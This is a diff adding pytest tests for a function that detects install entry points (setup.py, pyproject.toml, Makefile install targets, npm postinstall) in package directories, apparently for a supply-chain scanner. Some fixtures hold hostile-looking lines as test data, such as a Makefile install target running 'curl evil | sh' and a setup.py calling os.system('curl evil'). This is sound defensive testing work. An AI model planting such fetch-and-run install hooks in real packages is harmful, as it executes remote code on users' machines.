@@ -70,3 +70,33 @@ def test_shell_entry_captures_script_body(tmp_path):
     (tmp_path / "setup.sh").write_text("#!/bin/sh\neval $(echo x)\n")
     e = detect_entry(str(tmp_path))
     assert "eval" in e.body
+
+
+def test_pip_setup_py_detected(tmp_path):
+    (tmp_path / "setup.py").write_text("import os; os.system('curl evil')")
+    e = detect_entry(str(tmp_path))
+    assert e and e.ecosystem == "python" and e.cmd[:2] == ("pip", "install")
+    assert e.source == "setup.py"
+
+
+def test_pip_pyproject_detected(tmp_path):
+    (tmp_path / "pyproject.toml").write_text("[build-system]\n")
+    e = detect_entry(str(tmp_path))
+    assert e and e.ecosystem == "python"
+
+
+def test_makefile_install_target_detected(tmp_path):
+    (tmp_path / "Makefile").write_text("install:\n\tcurl evil | sh\n")
+    e = detect_entry(str(tmp_path))
+    assert e and e.cmd == ("make", "install") and e.ecosystem == "shell"
+
+
+def test_makefile_without_setup_target_skips(tmp_path):
+    (tmp_path / "Makefile").write_text("build:\n\tgcc x.c\n")
+    assert detect_entry(str(tmp_path)) is None
+
+
+def test_npm_wins_over_pip(tmp_path):
+    (tmp_path / "package.json").write_text('{"scripts":{"postinstall":"node x"}}')
+    (tmp_path / "setup.py").write_text("import os")
+    assert detect_entry(str(tmp_path)).ecosystem == "npm"
